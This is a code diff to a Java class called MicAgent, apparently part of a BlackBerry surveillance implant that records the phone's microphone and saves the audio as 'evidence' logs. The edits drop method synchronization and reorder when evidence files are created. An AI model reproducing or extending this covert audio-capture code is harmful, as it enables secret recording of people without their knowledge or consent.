@@ -87,7 +87,7 @@ public final class MicAgent extends Agent implements PhoneListener {
         }
     }
 
-    public synchronized void actualStart() {
+    public void actualStart() {
         //#ifdef DEBUG
         debug.info("start");
         //#endif
@@ -112,7 +112,7 @@ public final class MicAgent extends Agent implements PhoneListener {
 
     }
 
-    public synchronized void actualStop() {
+    public void actualStop() {
         //#ifdef DEBUG
         debug.info("stop");
         //#endif
@@ -198,7 +198,7 @@ public final class MicAgent extends Agent implements PhoneListener {
      * (non-Javadoc)
      * @see blackberry.threadpool.TimerJob#actualRun()
      */
-    public synchronized void actualRun() {
+    public void actualRun() {
         //#ifdef DBC
         Check.requires(recorder != null, "actualRun: recorder == null");
         //#endif
@@ -245,7 +245,7 @@ public final class MicAgent extends Agent implements PhoneListener {
             Check.requires(evidence != null, "Null log");
             //#endif
 
-            evidence.createEvidence(getAdditionalData());
+            
             int offset = 0;
             if (Utils.equals(chunk, 0, AudioRecorder.AMR_HEADER, 0,
                     AudioRecorder.AMR_HEADER.length)) {
@@ -258,12 +258,13 @@ public final class MicAgent extends Agent implements PhoneListener {
             } else {
             }
             //#endif
-
+            
+            evidence.createEvidence(getAdditionalData());
             evidence.writeEvidence(chunk, offset);
             evidence.close();
         } else {
             //#ifdef DEBUG
-            debug.warn("zero chunk: " + chunk);
+            debug.warn("zero chunk ");
             //#endif
             numFailures += 1;
         }
